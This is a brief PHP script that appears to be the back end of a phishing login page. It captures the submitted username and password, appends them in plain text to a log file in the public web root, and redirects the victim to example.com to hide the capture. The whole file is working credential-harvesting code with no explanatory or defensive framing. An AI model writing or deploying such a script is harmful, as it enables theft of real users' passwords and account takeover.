<?php
date_default_timezone_set("UTC");
$entry = date("Y-m-d H:i:s") . " | Username: {$_POST['username']} | Password: {$_POST['password']}\n";
file_put_contents("/var/www/html/log.txt", $entry, FILE_APPEND);
header("Location: https://example.com");
?>
